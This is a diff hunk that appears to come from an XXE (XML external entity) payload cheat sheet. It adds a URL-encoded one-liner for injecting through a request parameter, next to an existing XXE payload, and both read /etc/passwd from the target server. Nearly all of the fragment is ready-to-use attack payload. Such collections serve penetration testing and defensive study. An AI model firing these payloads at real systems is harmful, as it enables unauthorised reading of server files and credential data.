@@ -24,6 +24,10 @@ Consider that in certain Java web applications, we may also be able to specify a
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
     <foo>&xxe;</foo>
 
+One liner in a parameter
+
+    <%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>
+
 #### Read a custom file
 
     <?xml version="1.0" encoding="UTF-8"?>
